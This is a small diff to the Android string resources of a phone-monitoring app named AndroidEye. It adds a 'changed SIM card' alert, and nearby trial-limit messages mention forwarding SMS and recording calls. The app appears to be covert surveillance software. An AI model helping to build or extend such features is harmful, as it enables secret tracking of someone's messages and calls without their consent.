@@ -144,6 +144,7 @@
     <string name="msg_expired_alert">AndroidEye: trial expired, please contact supporter(QQ:602592749) to buy a key.</string>
     <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到10条，如需继续使用请联系客服QQ:602592749。</string>
     <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到5次，如需继续使用请联系客服QQ:602592749。</string>
+    <string name="msg_changed_sim">%s changed SIM card.</string>
     
     <!-- Indication -->
     <string name="indication_register_ok">注册成功。</string>
